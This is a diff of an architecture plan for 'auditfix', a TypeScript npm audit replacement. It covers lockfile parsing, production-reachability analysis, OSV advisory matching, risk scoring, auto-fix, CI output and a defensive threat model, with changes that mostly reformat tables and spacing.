@@ -1,9 +1,11 @@
 # auditfix — Architecture Plan
 
 ## Overview
+
 A smarter npm dependency security CLI that replaces `npm audit` with actionable, noise-free vulnerability reports. Filters by production reachability, auto-patches safe updates, community-driven false positive allow-lists, and monitors for supply chain attacks.
 
 ## The Problem (Quantified)
+
 - 65% of teams bypass or delay vulnerability fixes due to alert fatigue
 - Only 40% of developers are satisfied with npm security tools
 - npm audit doesn't distinguish production vs devDependency exposure
@@ -13,6 +15,7 @@ A smarter npm dependency security CLI that replaces `npm audit` with actionable,
 - That one `nth-check` ReDoS has been haunting React projects for 3+ years
 
 ## Tech Stack
+
 - **Language:** TypeScript (ESM, `"type": "module"`, Node.js 18+)
 - **Package Manager:** pnpm (for development), works with npm/yarn/pnpm projects
 - **CLI Framework:** commander v12+ (mature, first-class TypeScript, ships own `.d.ts`)
@@ -30,13 +33,14 @@ A smarter npm dependency security CLI that replaces `npm audit` with actionable,
 
 Three-tier advisory resolution with graceful degradation:
 
-| Tier | Source | Auth | Use Case |
-|------|--------|------|----------|
-| **Primary** | OSV.dev batch API (`POST /v1/querybatch`) | None | Real-time scanning. Up to 1,000 packages per request. 1-3s for typical project. |
-| **Secondary** | Bundled advisory index (built from OSV bulk export at publish time) | None | Offline/fallback. Pre-built index shipped in the npm package (~1-2MB gzip). |
-| **Tertiary** | npm bulk advisory endpoint (`POST /-/npm/v1/security/advisories/bulk`) | None | Fallback when OSV unreachable. Send `{ "pkg": ["1.2.3"] }` map. This is what `npm audit` uses internally. |
+| Tier          | Source                                                                 | Auth | Use Case                                                                                                  |
+| ------------- | ---------------------------------------------------------------------- | ---- | --------------------------------------------------------------------------------------------------------- |
+| **Primary**   | OSV.dev batch API (`POST /v1/querybatch`)                              | None | Real-time scanning. Up to 1,000 packages per request. 1-3s for typical project.                           |
+| **Secondary** | Bundled advisory index (built from OSV bulk export at publish time)    | None | Offline/fallback. Pre-built index shipped in the npm package (~1-2MB gzip).                               |
+| **Tertiary**  | npm bulk advisory endpoint (`POST /-/npm/v1/security/advisories/bulk`) | None | Fallback when OSV unreachable. Send `{ "pkg": ["1.2.3"] }` map. This is what `npm audit` uses internally. |
 
 **Why OSV batch API as primary (not git repo clone):**
+
 - Real-time freshness — no staleness window
 - Single HTTP call for entire lockfile (up to 1,000 packages per batch)
 - 1-3 seconds for typical project with 500 dependencies
@@ -45,11 +49,13 @@ Three-tier advisory resolution with graceful degradation:
 - The `github/advisory-database` git repo is ~2-3GB — **unacceptable for a CLI tool**
 
 **OSV batch API caveats:**
+
 - Batch endpoint returns **abbreviated** results (just `id` + `modified`)
 - Must follow up with `GET /v1/vulns/{id}` for full details (CVSS, affected ranges, fix versions)
 - Follow-up fetches use bounded concurrency (10 parallel requests)
 
 **Bundled advisory index (offline fallback):**
+
 - Built at npm publish time from the OSV bulk data export: `https://osv-vulnerabilities.storage.googleapis.com/npm/all.zip`
 - The GCS bucket `gs://osv-vulnerabilities/npm/` contains all npm advisories as individual JSON files + `all.zip`
 - ~8,000-10,000 npm advisories, each 1-5KB → ~24MB raw JSON → ~5-15MB zip
@@ -60,6 +66,7 @@ Three-tier advisory resolution with graceful degradation:
 **Optional auto-refresh:** On first run, if bundled index is stale (> 24hr), download fresh `npm/all.zip` in background and cache to `~/.auditfix/cache/`. ~5-15MB download, takes 2-5 seconds.
 
 **GHSA GraphQL API (enrichment only, not primary):**
+
 - Requires GitHub token (any token with zero scopes works)
 - 5,000 points/hr rate limit (point-cost system, not simple request count)
 - Cannot batch by package name natively — must use GraphQL aliases (~20-30 packages per query)
@@ -67,9 +74,11 @@ Three-tier advisory resolution with graceful degradation:
 - Token sourced from: `GITHUB_TOKEN` env var > `gh auth token` fallback > degrade to OSV-only
 
 ### Config Merge Order
+
 ```
 finalConfig = { ...defaults, ...configFile, ...cliFlags }
 ```
+
 Commander's `getOptionValueSource()` distinguishes explicit CLI flags from defaults, enabling correct merge precedence.
 
 ## Project Structure
@@ -179,17 +188,18 @@ auditfix/
 
 Auto-detect project type and parse using the lightest possible approach (no arborist):
 
-| Lockfile | Parser | Dev Detection | Notes |
-|----------|--------|---------------|-------|
-| `package-lock.json` v3 | `JSON.parse` → read `packages` field (flat map) | Trust `dev`/`optional`/`devOptional` flags (npm pre-computes these) | Preferred. npm 9+. No flag = production. |
-| `package-lock.json` v2 | `JSON.parse` → read `packages` field (ignore `dependencies`) | Same as v3 — `packages` field identical | npm 7-8. Contains both formats; always read `packages`. |
-| `package-lock.json` v1 | `JSON.parse` → recursively walk nested `dependencies` | `dev: true` flag on entries | Legacy (npm 5-6). Increasingly rare. |
-| `yarn.lock` v1 (classic) | `@yarnpkg/lockfile` (~20KB) | **NOT in lockfile.** Must cross-reference `package.json` and BFS from production roots. | Custom format (not JSON/YAML). |
-| `yarn.lock` v2+ (berry) | `js-yaml` (standard YAML) | **NOT in lockfile.** Must cross-reference `package.json` and BFS from production roots. | PnP vs node_modules doesn't affect lockfile format. |
-| `pnpm-lock.yaml` v9 | `js-yaml` → read `importers` + `snapshots` | `importers['.']` separates `dependencies` from `devDependencies`. Walk from production roots. | pnpm v9+. `snapshots` has dependency graph. Snapshot keys include peer dep suffixes: `react-dom@18.2.0(react@18.2.0)`. Importer `version` fields contain the full snapshot key. Strip `(...)` suffix to map to `packages` key. |
-| `pnpm-lock.yaml` v5/v6 | `js-yaml` → read `packages` | `dev: true` flag on entries (like npm) | Older pnpm. Keys are `/pkg/version` paths. |
+| Lockfile                 | Parser                                                       | Dev Detection                                                                                 | Notes                                                                                                                                                                                                                          |
+| ------------------------ | ------------------------------------------------------------ | --------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
+| `package-lock.json` v3   | `JSON.parse` → read `packages` field (flat map)              | Trust `dev`/`optional`/`devOptional` flags (npm pre-computes these)                           | Preferred. npm 9+. No flag = production.                                                                                                                                                                                       |
+| `package-lock.json` v2   | `JSON.parse` → read `packages` field (ignore `dependencies`) | Same as v3 — `packages` field identical                                                       | npm 7-8. Contains both formats; always read `packages`.                                                                                                                                                                        |
+| `package-lock.json` v1   | `JSON.parse` → recursively walk nested `dependencies`        | `dev: true` flag on entries                                                                   | Legacy (npm 5-6). Increasingly rare.                                                                                                                                                                                           |
+| `yarn.lock` v1 (classic) | `@yarnpkg/lockfile` (~20KB)                                  | **NOT in lockfile.** Must cross-reference `package.json` and BFS from production roots.       | Custom format (not JSON/YAML).                                                                                                                                                                                                 |
+| `yarn.lock` v2+ (berry)  | `js-yaml` (standard YAML)                                    | **NOT in lockfile.** Must cross-reference `package.json` and BFS from production roots.       | PnP vs node_modules doesn't affect lockfile format.                                                                                                                                                                            |
+| `pnpm-lock.yaml` v9      | `js-yaml` → read `importers` + `snapshots`                   | `importers['.']` separates `dependencies` from `devDependencies`. Walk from production roots. | pnpm v9+. `snapshots` has dependency graph. Snapshot keys include peer dep suffixes: `react-dom@18.2.0(react@18.2.0)`. Importer `version` fields contain the full snapshot key. Strip `(...)` suffix to map to `packages` key. |
+| `pnpm-lock.yaml` v5/v6   | `js-yaml` → read `packages`                                  | `dev: true` flag on entries (like npm)                                                        | Older pnpm. Keys are `/pkg/version` paths.                                                                                                                                                                                     |
 
 Parse into normalized dependency graph (adjacency list, not tree):
+
 ```typescript
 // Key: "name@version" — handles deduplication properly
 type DependencyGraph = Map<string, DependencyNode>;
@@ -197,13 +207,13 @@ type DependencyGraph = Map<string, DependencyNode>;
 type DependencyNode = {
   name: string;
   version: string;
-  resolved: string;         // registry URL
-  integrity: string;        // sha hash
-  dependencies: string[];   // keys into the graph ("name@version")
-  isProduction: boolean;    // true if reachable from production roots
-  isDev: boolean;           // true if ONLY reachable via devDependencies
-  isOptional: boolean;      // true if ONLY reachable via optionalDependencies
-  depth: number;            // shortest distance from root
+  resolved: string; // registry URL
+  integrity: string; // sha hash
+  dependencies: string[]; // keys into the graph ("name@version")
+  isProduction: boolean; // true if reachable from production roots
+  isDev: boolean; // true if ONLY reachable via devDependencies
+  isOptional: boolean; // true if ONLY reachable via optionalDependencies
+  depth: number; // shortest distance from root
   dependencyPath: string[]; // shortest root -> ... -> this package
 };
 ```
@@ -215,12 +225,14 @@ type DependencyNode = {
 Two strategies depending on lockfile type:
 
 **Strategy A — Trust pre-computed flags (npm lockfiles):**
+
 - npm lockfile v2/v3 `packages` entries already have `dev`, `optional`, `devOptional` boolean flags
 - npm computes these at install time by walking the graph from root
 - Rule: if none of `dev`, `optional`, `devOptional` are `true` → the package is production
 - No graph traversal needed — just read the flags. O(n) scan.
 
 **Strategy B — BFS from production roots (yarn/pnpm, or when flags are unavailable):**
+
 1. Read `package.json` → collect `dependencies` keys (production roots)
 2. Build adjacency list from lockfile dependency entries
 3. BFS from each production root, following `dependencies` edges
@@ -260,6 +272,7 @@ Three-tier resolution with fallback chain (see Advisory Data Strategy above):
 4. **Last resort: stale cache** — use cached advisories regardless of TTL, warn user
 
 **OSV events[] → semver range conversion (`osv-ranges.ts`):**
+
 ```typescript
 // Convert OSV affected[].ranges[].events to a node-semver range string
 // ~20 lines, no library needed
@@ -267,21 +280,22 @@ function eventsToSemverRange(events: OsvEvent[]): string {
   const ranges: string[] = [];
   let currentIntroduced: string | null = null;
 
-  for (const event of events) {                         // process in order (already sorted by OSV)
+  for (const event of events) {
+    // process in order (already sorted by OSV)
     if (event.introduced !== undefined) {
       currentIntroduced = event.introduced === "0" ? "0.0.0" : event.introduced;
     }
     if (event.fixed !== undefined && currentIntroduced) {
-      ranges.push(`>=${currentIntroduced} <${event.fixed}`);   // exclusive upper bound
+      ranges.push(`>=${currentIntroduced} <${event.fixed}`); // exclusive upper bound
       currentIntroduced = null;
     }
     if (event.last_affected !== undefined && currentIntroduced) {
-      ranges.push(`>=${currentIntroduced} <=${event.last_affected}`);  // inclusive upper bound
+      ranges.push(`>=${currentIntroduced} <=${event.last_affected}`); // inclusive upper bound
       currentIntroduced = null;
     }
   }
   if (currentIntroduced !== null) {
-    ranges.push(`>=${currentIntroduced}`);              // no fix exists — open-ended
+    ranges.push(`>=${currentIntroduced}`); // no fix exists — open-ended
   }
   return ranges.join(" || ");
 }
@@ -293,29 +307,32 @@ function eventsToSemverRange(events: OsvEvent[]): string {
 ```
 
 Match advisories to installed packages by:
+
 - Package name (exact match — use `name` field for npm aliased packages, not path key)
 - Version in affected range: `semver.satisfies(version, convertedRange, { includePrerelease: true })`
   - **CRITICAL:** Without `includePrerelease: true`, semver returns `false` for pre-release versions (e.g., `1.0.5-beta.1`) against ranges like `<1.0.5`. The beta almost certainly lacks the fix — this would be a silent false negative.
 
 **1.4 Risk Scoring**
+
 ```typescript
 type RiskScore = {
-  score: number;         // 0-100
-  label: 'critical' | 'high' | 'medium' | 'low' | 'info';
+  score: number; // 0-100
+  label: "critical" | "high" | "medium" | "low" | "info";
   factors: {
-    cvssScore: number;          // numeric 0.0-10.0 (parsed from CVSS v3.1 vector string)
-    cvssVector: string;         // raw vector, e.g. "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
+    cvssScore: number; // numeric 0.0-10.0 (parsed from CVSS v3.1 vector string)
+    cvssVector: string; // raw vector, e.g. "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
     productionReachable: boolean; // massive weight — the key differentiator
-    exploitAvailable: boolean;   // cross-reference CISA KEV or advisory references
-    fixAvailable: boolean;       // true if advisory has a "fixed" event in ranges
-    fixVersion: string | null;   // the patched version, if available
-    depth: number;               // shortest distance from root
-    directDependency: boolean;   // do you control this dep directly?
+    exploitAvailable: boolean; // cross-reference CISA KEV or advisory references
+    fixAvailable: boolean; // true if advisory has a "fixed" event in ranges
+    fixVersion: string | null; // the patched version, if available
+    depth: number; // shortest distance from root
+    directDependency: boolean; // do you control this dep directly?
   };
 };
 ```
 
 Scoring formula:
+
 - Production-reachable + exploit available + CVSS >= 7 = **critical**
 - Production-reachable + no exploit + CVSS >= 7 = **high**
 - Dev-only + any CVSS = **low** (unless install script vulnerability)
@@ -324,6 +341,7 @@ Scoring formula:
 ### Phase 2: Smart Fixing
 
 **2.1 Safe Auto-Fix**
+
 - For each vulnerability with a fix version:
   1. Check if fix is within parent's declared range: `semver.satisfies(fixVersion, parentDeclaredRange)`
   2. If YES → **safe update**. Can update lockfile without changing any `package.json`.
@@ -333,6 +351,7 @@ Scoring formula:
   6. If breaking: report with the exact upgrade path, what might break, and whether `overrides`/`resolutions` can force it
 
 **2.2 Upgrade Path Calculation**
+
 ```
 Vulnerability: qs@6.5.2 (ReDoS)
 Fix: qs@6.5.3+
@@ -346,6 +365,7 @@ Recommendation: Option 1 (auto-fixable)
 ```
 
 **2.3 Lockfile Writing**
+
 - Use the native package manager's resolution algorithm
 - npm: spawn `npm install --package-lock-only` with targeted overrides
 - pnpm: use `pnpm.overrides` in package.json
@@ -357,6 +377,7 @@ Recommendation: Option 1 (auto-fixable)
 ### Phase 3: CLI & Output
 
 **3.1 Commands**
+
 ```bash
 # Main audit (default)
 npx auditfix
@@ -384,6 +405,7 @@ npx auditfix init
 ```
 
 **3.2 Terminal Output**
+
 ```
 auditfix v1.0.0 — scanning 847 packages
 
@@ -420,11 +442,13 @@ CI exit code: 1 (production vulnerabilities found)
 **3.3 CI Integration**
 
 Exit code convention (matches industry standard: npm audit, Snyk, audit-ci):
+
 - Exit code 0: no vulnerabilities above threshold (or all below configured severity)
 - Exit code 1: production-reachable vulnerabilities found above threshold
 - Exit code 2: tool error / misconfiguration (could not complete scan)
 
 SARIF output follows v2.1.0 spec (the only version GitHub Code Scanning supports):
+
 - `tool.driver.rules[]` — advisory definitions with `properties.security-severity` (float string 0.0-10.0)
 - `results[]` — each finding with `ruleId`, `level` (error/warning/note), `locations[].physicalLocation.artifactLocation.uri`
 - File size must be under 10MB (5MB gzip for GitHub upload)
@@ -437,18 +461,21 @@ GitHub Actions example in README + SARIF upload for GitHub Security tab
 > **Deferred to post-v1.** This phase is essentially a separate product vertical (comparable to Socket.dev). Ship the core audit engine first, prove value, then layer supply chain features.
 
 **4.1 Maintainer Watch**
+
 - For each direct dependency, check:
   - Has the npm maintainer changed recently?
   - Has the GitHub repo ownership transferred?
   - Flag: "chalk maintainer changed 3 days ago"
 
 **4.2 Install Script Scanner**
+
 - Parse all `preinstall`, `install`, `postinstall` scripts in dependency tree
 - Flag new scripts that appeared in latest version
 - Flag scripts that make network calls, exec arbitrary code, or access filesystem outside node_modules
 - This catches the exact attack vector from the Sept 2025 npm incident
 
 **4.3 Publish Anomaly Detection**
+
 - Check npm publish metadata:
   - Published from a different IP/location than usual?
   - Massive file size change between versions?
@@ -458,6 +485,7 @@ GitHub Actions example in README + SARIF upload for GitHub Security tab
 ### Phase 5: Community Allow-List
 
 **5.1 Local Allow-List (.auditfixignore)**
+
 ```json
 {
   "ignore": [
@@ -472,6 +500,7 @@ GitHub Actions example in README + SARIF upload for GitHub Security tab
 ```
 
 **5.2 Community-Maintained False Positives**
+
 - `community/known-false-positives.json` in the repo
 - PRs welcome — maintainers review and merge
 - Fetched at runtime (cached) so users get updates without upgrading
@@ -550,37 +579,42 @@ Report Generator (terminal / JSON / SARIF v2.1.0)
 Sequenced for fastest time-to-value. Ship the differentiator (reachability) first.
 
 ### MVP (v0.1) — Core Audit Engine
-| # | Milestone | Deliverable |
-|---|-----------|-------------|
-| 1 | Lockfile parsing | Parse npm lockfile v2/v3 into normalized graph (yarn + pnpm follow) |
-| 2 | Reachability analysis | Mark every dep as production/dev/optional |
-| 3 | Advisory fetching + matching | Pull from OSV (batch) + GHSA (enrichment), match to installed packages |
-| 4 | Risk scoring | Score each vuln by reachability + CVSS + exploit status |
-| 5 | Terminal output | Pretty, actionable CLI output with clear recommendations |
+
+| #   | Milestone                    | Deliverable                                                            |
+| --- | ---------------------------- | ---------------------------------------------------------------------- |
+| 1   | Lockfile parsing             | Parse npm lockfile v2/v3 into normalized graph (yarn + pnpm follow)    |
+| 2   | Reachability analysis        | Mark every dep as production/dev/optional                              |
+| 3   | Advisory fetching + matching | Pull from OSV (batch) + GHSA (enrichment), match to installed packages |
+| 4   | Risk scoring                 | Score each vuln by reachability + CVSS + exploit status                |
+| 5   | Terminal output              | Pretty, actionable CLI output with clear recommendations               |
 
 ### v0.2 — CI & Allow-List
-| # | Milestone | Deliverable |
-|---|-----------|-------------|
-| 6 | CI mode | Exit codes, JSON output, SARIF format |
-| 7 | Allow-list (local) | .auditfixignore with expiry dates |
+
+| #   | Milestone          | Deliverable                           |
+| --- | ------------------ | ------------------------------------- |
+| 6   | CI mode            | Exit codes, JSON output, SARIF format |
+| 7   | Allow-list (local) | .auditfixignore with expiry dates     |
 
 ### v0.3 — Auto-Fix
-| # | Milestone | Deliverable |
-|---|-----------|-------------|
-| 8 | Safe auto-fix | Non-breaking semver patches applied automatically |
+
+| #   | Milestone     | Deliverable                                       |
+| --- | ------------- | ------------------------------------------------- |
+| 8   | Safe auto-fix | Non-breaking semver patches applied automatically |
 
 ### v1.0 — Community & Launch
-| # | Milestone | Deliverable |
-|---|-----------|-------------|
-| 9 | Community allow-list | Shared false-positive database with integrity verification |
-| 10 | Yarn + pnpm lockfile support | Full parser coverage for yarn classic/berry + pnpm |
-| 11 | Workspace/monorepo support | Handle npm/yarn/pnpm workspaces |
-| 12 | Polish + README + publish | npm publish, GitHub Actions example, logo, docs |
+
+| #   | Milestone                    | Deliverable                                                |
+| --- | ---------------------------- | ---------------------------------------------------------- |
+| 9   | Community allow-list         | Shared false-positive database with integrity verification |
+| 10  | Yarn + pnpm lockfile support | Full parser coverage for yarn classic/berry + pnpm         |
+| 11  | Workspace/monorepo support   | Handle npm/yarn/pnpm workspaces                            |
+| 12  | Polish + README + publish    | npm publish, GitHub Actions example, logo, docs            |
 
 ### v1.1+ — Supply Chain (Post-Launch)
-| # | Milestone | Deliverable |
-|---|-----------|-------------|
-| 13 | Supply chain monitoring | Maintainer changes, script scanning, publish anomalies |
+
+| #   | Milestone               | Deliverable                                            |
+| --- | ----------------------- | ------------------------------------------------------ |
+| 13  | Supply chain monitoring | Maintainer changes, script scanning, publish anomalies |
 
 ## Key Design Decisions
 
@@ -596,16 +630,16 @@ Sequenced for fastest time-to-value. Ship the differentiator (reachability) firs
 
 ## Error Handling Strategy
 
-| Failure | Behavior | Exit Code |
-|---------|----------|-----------|
-| OSV API unreachable | Fall through to bundled index + npm bulk endpoint. Warn user. | — |
-| npm advisory endpoint also unreachable | Use local cache regardless of TTL. Warn "stale data" with age. | — |
-| No cache + no network | Use bundled advisory index (built at publish time). Warn "offline mode". | 0 (with warning) |
-| Invalid/corrupt lockfile | Exit with clear error identifying parse failure location. | 2 |
-| Unsupported lockfile version | Exit with error stating minimum supported version. | 2 |
-| GitHub token missing | Not an error. GHSA is enrichment-only. OSV/npm work without auth. | — |
-| Lockfile not found | Exit with "no lockfile found" and suggest running `npm install`. | 2 |
-| `--fix` with no writable lockfile | Exit with error. Never silently skip fixes. | 2 |
+| Failure                                | Behavior                                                                 | Exit Code        |
+| -------------------------------------- | ------------------------------------------------------------------------ | ---------------- |
+| OSV API unreachable                    | Fall through to bundled index + npm bulk endpoint. Warn user.            | —                |
+| npm advisory endpoint also unreachable | Use local cache regardless of TTL. Warn "stale data" with age.           | —                |
+| No cache + no network                  | Use bundled advisory index (built at publish time). Warn "offline mode". | 0 (with warning) |
+| Invalid/corrupt lockfile               | Exit with clear error identifying parse failure location.                | 2                |
+| Unsupported lockfile version           | Exit with error stating minimum supported version.                       | 2                |
+| GitHub token missing                   | Not an error. GHSA is enrichment-only. OSV/npm work without auth.        | —                |
+| Lockfile not found                     | Exit with "no lockfile found" and suggest running `npm install`.         | 2                |
+| `--fix` with no writable lockfile      | Exit with error. Never silently skip fixes.                              | 2                |
 
 All errors are non-destructive — the tool never modifies files on failure and always exits with a clear message.
 
@@ -615,22 +649,23 @@ A security tool must itself be secure. These are mandatory implementation requir
 
 ### Threat Model Summary
 
-| # | Threat | Severity | Attack Vector | Mitigation |
-|---|--------|----------|--------------|------------|
-| T1 | Community allow-list weaponized to suppress warnings | **CRITICAL** | Remote URL compromise, rollback, cache poisoning | Sigstore signing + freshness timestamps + default OFF |
-| T2 | Bundled advisory index manipulation | **MEDIUM** | npm package compromise, stale data | Index built from OSV bulk export at publish time, cross-source verification, staleness threshold |
-| T3 | Shell command injection in `--fix` mode | **HIGH** | Malicious lockfile content, crafted package names | `execFile`/`spawn` only (never `exec`), strict input validation |
-| T4 | Cache directory attacks | **MEDIUM** | Local filesystem access, shared CI runners | HMAC integrity, 0700 permissions, atomic writes, symlink protection |
-| T5 | API response manipulation | **MEDIUM** | MITM, API compromise, malformed responses | Content-Type check, size limits, schema validation, cross-source verification |
-| T6 | Prototype pollution via parsed data | **MEDIUM** | Malicious lockfile/advisory with `__proto__` keys | Sanitize after parse, never deep-merge untrusted data |
-| T7 | npm typosquatting | **MEDIUM** | Attacker registers `audit-fix`, `auditFix`, etc. | Register defensive names, npm provenance, no postinstall |
-| T8 | Token leakage | **LOW** | Debug logs, CI output | Redact token patterns, never accept via CLI args |
+| #   | Threat                                               | Severity     | Attack Vector                                     | Mitigation                                                                                       |
+| --- | ---------------------------------------------------- | ------------ | ------------------------------------------------- | ------------------------------------------------------------------------------------------------ |
+| T1  | Community allow-list weaponized to suppress warnings | **CRITICAL** | Remote URL compromise, rollback, cache poisoning  | Sigstore signing + freshness timestamps + default OFF                                            |
+| T2  | Bundled advisory index manipulation                  | **MEDIUM**   | npm package compromise, stale data                | Index built from OSV bulk export at publish time, cross-source verification, staleness threshold |
+| T3  | Shell command injection in `--fix` mode              | **HIGH**     | Malicious lockfile content, crafted package names | `execFile`/`spawn` only (never `exec`), strict input validation                                  |
+| T4  | Cache directory attacks                              | **MEDIUM**   | Local filesystem access, shared CI runners        | HMAC integrity, 0700 permissions, atomic writes, symlink protection                              |
+| T5  | API response manipulation                            | **MEDIUM**   | MITM, API compromise, malformed responses         | Content-Type check, size limits, schema validation, cross-source verification                    |
+| T6  | Prototype pollution via parsed data                  | **MEDIUM**   | Malicious lockfile/advisory with `__proto__` keys | Sanitize after parse, never deep-merge untrusted data                                            |
+| T7  | npm typosquatting                                    | **MEDIUM**   | Attacker registers `audit-fix`, `auditFix`, etc.  | Register defensive names, npm provenance, no postinstall                                         |
+| T8  | Token leakage                                        | **LOW**      | Debug logs, CI output                             | Redact token patterns, never accept via CLI args                                                 |
 
 ### S1. Community Allow-List Integrity (CRITICAL)
 
 The community allow-list is the highest-risk attack surface — compromising it silently disables the tool's core function.
 
 **Requirements:**
+
 - **Default to OFF.** Config: `"communityAllowList": false`. Users must explicitly opt in after understanding the trust implications.
 - **Cryptographic signing via Sigstore/cosign.** The allow-list JSON must be signed by a maintainer identity. The tool verifies the signature against the Rekor transparency log. No GPG key management needed.
 - **Freshness timestamp.** The signed payload must include a `notValidAfter` date (30 days from signing). Expired signatures are rejected — the tool falls back to local-only allow-list and warns.
@@ -641,6 +676,7 @@ The community allow-list is the highest-risk attack surface — compromising it 
 ### S2. Advisory Data Integrity (MEDIUM)
 
 **Requirements:**
+
 - **Bundled index built from trusted source only.** Built at publish time from `https://osv-vulnerabilities.storage.googleapis.com/npm/all.zip` (Google-operated GCS bucket). URL hardcoded in build script, not configurable.
 - **Advisory count floor.** Maintain a minimum expected advisory count in the bundled index (updated each release). If the index has dramatically fewer entries than expected, treat as suspicious and fall through to live API.
 - **Cross-reference discrepancies.** When using multiple sources (OSV API + bundled index + npm), flag if a critical advisory exists in one source but is absent from another.
@@ -651,6 +687,7 @@ The community allow-list is the highest-risk attack surface — compromising it 
 ### S3. Shell Injection Prevention (HIGH)
 
 **Requirements:**
+
 - **NEVER use `child_process.exec()` with string interpolation.** All shell commands must use `child_process.execFile()` or `child_process.spawn()` with argument arrays. These bypass the shell entirely.
 - **Validate all package names** against strict regex before any use: `/^(@[a-z0-9-~][a-z0-9-._~]*\/)?[a-z0-9-~][a-z0-9-._~]*$/`
 - **Validate all version strings** with `semver.valid()` before passing to any shell command or `semver.satisfies()`. Reject and skip any version string > 256 characters (semver `MAX_LENGTH`).
@@ -660,6 +697,7 @@ The community allow-list is the highest-risk attack surface — compromising it 
 ### S4. Cache Integrity (MEDIUM)
 
 **Requirements:**
+
 - **Directory permissions:** Create `~/.auditfix/` with mode `0700`, cache files with mode `0600`.
 - **HMAC verification:** Generate a per-installation random key stored in `~/.auditfix/cache-key` (mode 0600). HMAC each cache file. Verify before reading.
 - **Never cache negative results.** Do NOT cache "no advisories found for pkg@version" — a new advisory could be published at any moment. Only cache positive advisory data (the actual advisory JSON). This prevents stale "all clear" cache entries from masking newly published vulnerabilities.
@@ -674,11 +712,13 @@ The community allow-list is the highest-risk attack surface — compromising it 
 ### S5. Input Parsing Safety (MEDIUM)
 
 **Requirements:**
+
 - **js-yaml:** Use `yaml.load()` with `DEFAULT_SCHEMA` only (safe by default in v4+). NEVER use `JS_SCHEMA`. Pin `js-yaml >= 4.0.0`.
 - **JSON.parse reviver:** Use a reviver function that strips `__proto__`, `constructor`, and `prototype` keys from all parsed lockfiles and API responses:
   ```typescript
   JSON.parse(content, (key, value) => {
-    if (key === '__proto__' || key === 'constructor' || key === 'prototype') return undefined;
+    if (key === "__proto__" || key === "constructor" || key === "prototype")
+      return undefined;
     return value;
   });
   ```
@@ -693,6 +733,7 @@ The community allow-list is the highest-risk attack surface — compromising it 
 ### S6. Token Handling (LOW)
 
 **Requirements:**
+
 - **Never log tokens.** Redact strings matching `gh[ps]_[A-Za-z0-9_]+` and `github_pat_[A-Za-z0-9_]+` in the logger. Redact `Authorization` headers from all HTTP logging.
 - **Never accept tokens via CLI arguments.** Only via `GITHUB_TOKEN` env var or `gh auth token` subprocess. CLI args are visible in `ps` output.
 - **Clear token from memory after use.** Overwrite the variable once HTTP requests are configured.
@@ -700,6 +741,7 @@ The community allow-list is the highest-risk attack surface — compromising it 
 ### S7. Package Supply Chain (MEDIUM)
 
 **Requirements:**
+
 - **No `postinstall` script.** Advisory index is built at publish time and shipped in the package, or built lazily on first run.
 - **Enable npm provenance.** Use `--provenance` flag during `npm publish` in GitHub Actions. Attaches Sigstore attestation proving build origin.
 - **2FA on npm account.** Required for publishing. Use granular access tokens scoped to the single package.
@@ -713,6 +755,7 @@ The worst failure mode for a security tool is **silent false negatives** — rep
 ### Fail-Open Policy
 
 When data quality is uncertain, **fail open (warn loudly) rather than fail closed (block) or fail silent (miss)**:
+
 - Uncertain data → report with reduced confidence, not suppressed
 - Stale cache → use it but display age prominently
 - Parse error on one package → skip it with warning, scan the rest
@@ -721,6 +764,7 @@ When data quality is uncertain, **fail open (warn loudly) rather than fail close
 ### Confidence Metadata in Output
 
 Every scan report must include:
+
 ```
 Scanned: 847 packages | Skipped: 3 (2 local, 1 unparseable)
 Advisory source: OSV.dev API (real-time) | Matched against: 23 advisories
@@ -728,6 +772,7 @@ Confidence: HIGH
 ```
 
 Confidence levels:
+
 - **HIGH:** Using live OSV API, all packages parsed, no skipped entries
 - **MEDIUM:** Using cached API data (< 72hr), or < 5% of packages skipped
 - **LOW:** Using bundled index only, or > 5% of packages skipped, or cache > 72hr
@@ -735,42 +780,43 @@ Confidence levels:
 
 ### Maximum Staleness Threshold
 
-| Scenario | Behavior |
-|----------|----------|
-| OSV API reachable | Use real-time API results. Cache responses locally. Best quality. |
-| OSV unreachable, local cache < 4hr old | Use cached API responses. Warn "using cached data (X minutes old)". |
-| OSV unreachable, cache 4hr-72hr old | Use cached data. Warn prominently. Also try npm bulk endpoint. |
-| OSV unreachable, cache > 72hr or missing | Fall back to bundled index. Warn "using bundled advisory data from [publish date]". |
+| Scenario                                               | Behavior                                                                                                  |
+| ------------------------------------------------------ | --------------------------------------------------------------------------------------------------------- |
+| OSV API reachable                                      | Use real-time API results. Cache responses locally. Best quality.                                         |
+| OSV unreachable, local cache < 4hr old                 | Use cached API responses. Warn "using cached data (X minutes old)".                                       |
+| OSV unreachable, cache 4hr-72hr old                    | Use cached data. Warn prominently. Also try npm bulk endpoint.                                            |
+| OSV unreachable, cache > 72hr or missing               | Fall back to bundled index. Warn "using bundled advisory data from [publish date]".                       |
 | OSV unreachable, no cache, bundled index > 30 days old | **Exit code 2.** "Advisory data is too stale. Update the auditfix package or check network connectivity." |
-| All sources fail | **Exit code 2.** Refuse to produce results. Never exit 0 when data integrity is uncertain. |
+| All sources fail                                       | **Exit code 2.** Refuse to produce results. Never exit 0 when data integrity is uncertain.                |
 
 The tool must NEVER exit 0 ("safe") when data quality is uncertain. Uncertain data → exit 2 (tool error).
 
 ### Lockfile Edge Case Handling
 
-| Edge Case | Detection | Behavior |
-|-----------|-----------|----------|
-| **`npm:` aliased packages** | `name` field differs from path key | Use `name` field (not path) for advisory matching. **P0 — wrong name = missed vuln.** |
-| **`file:`/`link:`/`portal:`/`workspace:` deps** | `link: true` flag, or protocol prefix in `resolved` | Exclude from advisory matching (local code). Scan their transitive deps. |
-| **`git+https://` deps** | `resolved` starts with `git+` | Skip advisory matching with warning (version may not be semver). |
-| **`patch:` protocol (yarn) / `pnpm patch`** | Protocol prefix or `patchedDependencies` in lockfile | Annotate as "locally patched" in output. Still report advisory but note patch may address it. |
-| **Same package at multiple versions** | Multiple `name@version` entries for same `name` | Check EACH version independently against advisories. |
-| **npm `overrides` / yarn `resolutions`** | Present in `package.json` | Trust lockfile resolved versions. Note overrides in output for transparency. |
-| **Yarn Classic vs Berry detection** | Check for `__metadata:` in first lines | Berry: parse as YAML. Classic: use `@yarnpkg/lockfile`. Wrong parser = garbage. |
